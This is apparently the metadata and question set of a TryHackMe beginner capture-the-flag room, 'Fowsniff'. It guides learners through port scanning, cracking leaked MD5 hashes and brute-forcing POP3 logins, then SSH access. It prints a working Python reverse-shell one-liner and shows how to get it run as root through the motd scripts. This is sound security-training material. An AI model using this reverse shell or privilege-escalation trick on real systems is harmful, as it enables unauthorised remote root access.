{'image': 'https://tryhackme-images.s3.amazonaws.com/room-icons/97b218eed9688e9a5cbe136714b86288.jpeg', 'title': 'Fowsniff CTF', 'description': 'Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!', 'code': 'ctf', 'users': 19172, 'tags': ['portscanning', 'hashes', 'bruteforcing', 'pop3'], 'type': 'challenge', 'difficulty': 'easy', 'userCompleted': False, 'upVotes': 669, 'created': '2018-12-09T13:45:41.245Z', 'published': '2020-04-09T13:08:04.031Z', 'freeToUse': True, 'businessOnly': False, 'headerImage': '/img/banners/default_tryhackme.png', 'creator': 'ben', 'tasks': [{'taskTitle': 'Hack into the FowSniff organisation.', 'taskDesc': '<p>This boot2root machine is brilliant for new starters. You will have to enumerate this machine by finding open ports, do some online research (its amazing how much information Google can find for you), decoding hashes, brute forcing a pop3 login and much more!</p><p>This will be structured to go through what you need to do, step by step. Make sure you are <a href="http://tryhackme.com/access">connected to our network</a></p><p>Credit to <a href="https://twitter.com/berzerk0">berzerk0</a>\xa0for creating this machine.<span style="font-size:1rem;color:rgb(33, 37, 41);text-align:-webkit-center">\xa0</span><span style="font-size:1rem;color:rgb(33, 37, 41);font-weight:bolder;text-align:-webkit-center">This machine is used here with the explicit permission of the creator &lt;3</span></p>', 'taskType': 'vm', 'taskNo': 1, 'taskCreated': '2018-12-09T14:44:53.170Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5c0d1e90dfcd1513b307b7aa', 'questions': [{'questionNo': 1, 'question': '<p>Deploy the machine. On the top right of this you will see a <b>Deploy </b>button. Click on this to deploy the machine into the cloud. Wait a minute for it to become live.</p>', 'hint': ''}, {'questionNo': 2, 'question': '<p>Using nmap, scan this machine. What ports are open?</p>', 'hint': 'nmap -A -p- -sV MACHINE_IP'}, {'questionNo': 3, 'question': '<p>Using the information from the open ports. Look around. What can you find?</p>', 'hint': ''}, {'questionNo': 4, 'question': '<p>Using Google, can you find any public information about them?</p>', 'hint': 'There is a pastebin with all of the company employees emails and hashes. If the pastebin is down, check out TheWayBackMachine, or https://github.com/berzerk0/Fowsniff'}, {'questionNo': 5, 'question': '<p>Can you decode these md5 hashes? You can even use sites like <a href="https://hashkiller.io/listmanager" target="_blank">hashkiller</a> to decode them.</p>', 'hint': ''}, {'questionNo': 6, 'question': '<p>Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?</p>', 'hint': 'In metasploit there is a packages called: auxiliary/scanner/pop3/pop3_login where you can enter all the usernames and passwords you found to brute force this machines pop3 service.'}, {'questionNo': 7, 'question': "<p>What was seina's password to the email service?</p>", 'hint': ''}, {'questionNo': 8, 'question': '<p>Can you connect to the pop3 service with her credentials? What email information can you gather?</p>', 'hint': 'Use netcat with the port 110 to view her emails.\n\nnc <ip> 110'}, {'questionNo': 9, 'question': '<p>Looking through her emails, what was a temporary password set for her?</p>', 'hint': ''}, {'questionNo': 10, 'question': '<p>In the email, who send it? Using the password from the previous question and the senders username, connect to the machine using SSH.</p>', 'hint': ''}, {'questionNo': 11, 'question': '<p>Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?</p>', 'hint': 'cube.sh'}, {'questionNo': '12', 'question': '<p>Now you have found a file that can be edited by the group, can you edit it to include a reverse shell?</p><p><u>Python Reverse Shell:</u></p><p>python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&lt;IP&gt;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'</p><p>Other reverse shells: <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">here</a>.</p>', 'hint': 'Use a python reverse shell (make sure it runs as python3)'}, {'questionNo': '13', 'question': '<p>If you have not found out already, this file is run as root when a user connects to the machine using SSH. We know this as when we first connect we can see we get given a banner (with fowsniff corp). Look in\xa0<strong>/etc/update-motd.d/ </strong>file. If (after we have put our reverse shell in the cube file) we then include this file in the motd.d file, it will run as root and we will get a reverse shell as root!</p>', 'hint': 'Run the cube file to the motd.d file.'}, {'questionNo': '14', 'question': '<p>Start a netcat listener (nc -lvp 1234) and then re-login to the SSH service. You will then receive a reverse shell on your netcat session as root!</p>', 'hint': ''}, {'questionNo': '15', 'question': '<p>If you are <b>really really </b>stuck, there is a brilliant walkthrough here:\xa0<a href="https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/">https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/</a><b><a href="https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/">\xa0</a></b></p><p>If its easier, follow this walkthrough with the deployed machine on the site.</p>', 'hint': ''}]}]}